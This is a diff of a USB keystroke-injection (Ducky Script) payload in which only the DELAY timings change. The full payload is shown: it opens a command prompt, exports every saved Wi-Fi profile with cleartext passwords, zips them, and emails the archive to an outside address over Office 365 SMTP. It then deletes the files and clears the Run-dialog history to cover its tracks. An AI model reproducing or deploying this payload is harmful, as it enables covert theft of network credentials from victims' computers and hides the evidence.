@@ -2,67 +2,67 @@ GUI r
 DELAY 200
 STRING cmd
 ENTER
-DELAY 400
+DELAY 1000
 STRING cd Desktop
 ENTER
-DELAY 50
+DELAY 200
 STRING mkdir wifi
 ENTER
-DELAY 50
+DELAY 200
 STRING cd wifi
 ENTER
-DELAY 50
+DELAY 200
 STRING netsh wlan export profile key=clear 
 ENTER
-DELAY 300
+DELAY 3000
 STRING cd ..
 ENTER
-DELAY 50
+DELAY 200
 STRING powershell
 ENTER
-DELAY 1500
+DELAY 3000
 STRING Compress-Archive -Path wifi -DestinationPath wifi.zip
 ENTER
-DELAY 5000
+DELAY 10000
 STRING $SMTPServer = 'smtp.office365.com'
 ENTER
-DELAY 100
+DELAY 200
 STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
-DELAY 100
+DELAY 200
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-DELAY 100
+DELAY 200
 STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL HERE', 'SENDER PASSWORD HERE')
 ENTER
-DELAY 100
+DELAY 200
 STRING $wifimail = New-Object System.Net.Mail.MailMessage
 ENTER
-DELAY 100
+DELAY 200
 STRING $wifimail.From = 'SENDER EMAIL HERE'
 ENTER
-DELAY 100
+DELAY 200
 STRING $wifimail.To.Add('RECIVER EMAIL HERE')
 ENTER
-DELAY 100
+DELAY 200
 STRING $wifimail.Subject = "WiFi Passwords Script by GiKR-byte"
 ENTER
-DELAY 100
+DELAY 200
 STRING $wifimail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
 ENTER
-DELAY 100
+DELAY 200
 STRING $wifimail.Attachments.Add("wifi.zip")
 ENTER
-DELAY 100
+DELAY 200
 STRING $SMTPInfo.Send($wifimail)
 ENTER
-DELAY 100
+DELAY 200
 STRING Remove-Item wifi -Recurse -Force -Confirm:$false
 ENTER
-DELAY 100
+DELAY 200
 STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 ENTER
-DELAY 100
+DELAY 200
 STRING exit
 ENTER
 DELAY 500
